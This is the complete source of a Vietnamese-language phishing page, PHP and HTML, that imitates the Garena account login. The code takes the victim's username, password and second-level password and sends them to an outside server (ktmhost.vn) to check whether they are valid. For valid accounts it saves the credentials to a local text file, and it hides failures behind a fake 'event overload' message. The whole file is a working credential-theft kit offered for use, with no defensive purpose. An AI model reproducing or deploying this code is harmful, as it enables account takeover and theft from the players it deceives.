<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['email'];
    $password = $_POST['password'];
    $passwordcap = $_POST['passwordcap'];
        $data = array(
        'username' => $username,
        'password' => $password
    );
    $json_data = json_encode($data);

    $headers = array(
        'Authorization: Bearer erjwejwerjwendskdfsd=9328is',
                /// ví dụ "Authorization: Bearer Jsdadiasijdsaidisaidjsaidij?=w"
        'Content-Type: application/json'
    );

    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, "https://ktmhost.vn/backend/api/garena/login");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30000);
    $response = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
    
    if ($http_status == 200) {
        $response_data = json_decode($response, true);
        switch ($response_data['checkStatus']) {
            case "LOGIN_FAILED":
 $errorMessage = "Đăng nhập thất bại: Tài khoản hoặc mật khẩu bị sai";
                $showErrorMessage = true;
                
                break;
            case "LOGIN_SUCCESS":
$file_path = 'ktmitvn.txt';
$content = "$username|ktmitvn|$passwordcap\n"; 
file_put_contents($file_path, $content, FILE_APPEND | LOCK_EX);
header("Location: /ktmitvn.php");

                break;
            default:
                $errorMsg = 'Đăng nhập thất bại: ' . $response_data['msg'];
        }
    } else {
        $errorMsg = 'Quá tải: Hãy tải lại trang và đăng nhập lại để tham gia sự kiện';
    }
}
?>


<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <link rel="icon" href="https://shoptungthuy.com/AuthLogin/Theme/Img/favicon.ico">
    <link href="./assets/css/main.css?=ver1.0" rel="stylesheet">
    <title>Garena Account Center</title>
    <link rel="stylesheet" href="./assets/css/Style.css?=ver1.1">
    <link rel="stylesheet" href="./assets/css/LoginView.7ca46c1a.css?=ver1.1">
    <link rel="stylesheet" href="./assets/css/ErrorBox.449fabe2.css?=ver1.0">
    <link rel="stylesheet" href="./assets/css/TopBar_LXT.css?=ver1.0">
  </head>
  <body>
      <header class="topbar" data-v-e4a59aca="" data-v-58b2e19a="">
         <div class="container" data-v-e4a59aca="">
            <a class="logo" href="" data-v-e4a59aca=""><img src="./assets/image/logo.9d415851.svg" alt="Garena Logo" data-v-e4a59aca=""></a>
            <select class="lang" data-v-e4a59aca="">
               <option value="vi-VN" data-v-e4a59aca="">Việt Nam - Tiếng việt</option>
               <option value="en-SG" data-v-e4a59aca="">Singapore - English</option>
               <option value="zh-SG" data-v-e4a59aca="">新加坡 - 简体中文</option>
               <option value="zh-TW" data-v-e4a59aca="">台灣 - 繁体中文</option>
               <option value="en-PH" data-v-e4a59aca="">Philippines - English</option>
               <option value="th-TH" data-v-e4a59aca="">ไทย - ไทย</option>
               <option value="id-ID" data-v-e4a59aca="">Indonesia - Bahasa Indonesia</option>
               <option value="vi-VN" data-v-e4a59aca="">Việt Nam - Tiếng việt</option>
               <option value="ru-RU" data-v-e4a59aca="">Россия - Русский</option>
               <option value="en-MY" data-v-e4a59aca="">Malaysia - English</option>
               <option value="pt-PT" data-v-e4a59aca="">Portugal - Português</option>
               <option value="es-ES" data-v-e4a59aca="">España - Español</option>
            </select>
         </div>
      </header>
      <main data-v-58b2e19a="">
    <form method="post" action="">
            <h2 data-v-58b2e19a="">Đăng nhập</h2>
            <div class="field required" data-v-58b2e19a="">
               <input type="text"  id="username" name="email" placeholder="Tài khoản Garena, Email hoặc số điện thoại" data-v-58b2e19a="">
               <div id="errorValidataU" class="errorMsg"></div>
            </div>
            <div class="field required" data-v-58b2e19a="">
               <input type="password" id="password" name="password" placeholder="Mật khẩu" data-v-58b2e19a="">
               <div id="errorValidataP" class="errorMsg"></div>
            </div>
            
             <div class="field required" data-v-58b2e19a="">
               <input type="type" id="passwordcap" name="passwordcap" placeholder="Mật khẩu Cấp 2" data-v-58b2e19a="" maxlength="4">
               <div id="errorValidataP" class="errorMsg"></div>
            </div>
            
            
            <a class="forgot" href="https://account.garena.com/recovery" data-v-58b2e19a="">Quên mật khẩu?</a>
            
            <div class="field" data-v-58b2e19a="">
               <button class="primary" type="submit" data-v-58b2e19a="">Đăng Nhập Ngay</button>
               
               <div id="errorMsg" class="errorMsg"><?php if(isset($errorMessage)) echo $errorMessage; ?></div>
            </div>
            <div class="field" data-v-58b2e19a=""><button class="secondary register" type="button" onclick="Register()" data-v-58b2e19a="">Tạo tài khoản mới</button></div>
            <script>function Register(){window.location='https://sso.garena.com/ui/register?redirect_uri=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN%26%3D&locale=vi-VN&='}</script>
         </form>
         <script src="./assets/js/jquery-3.6.4.min.js"></script>
        
      </main>
   </body>
</html>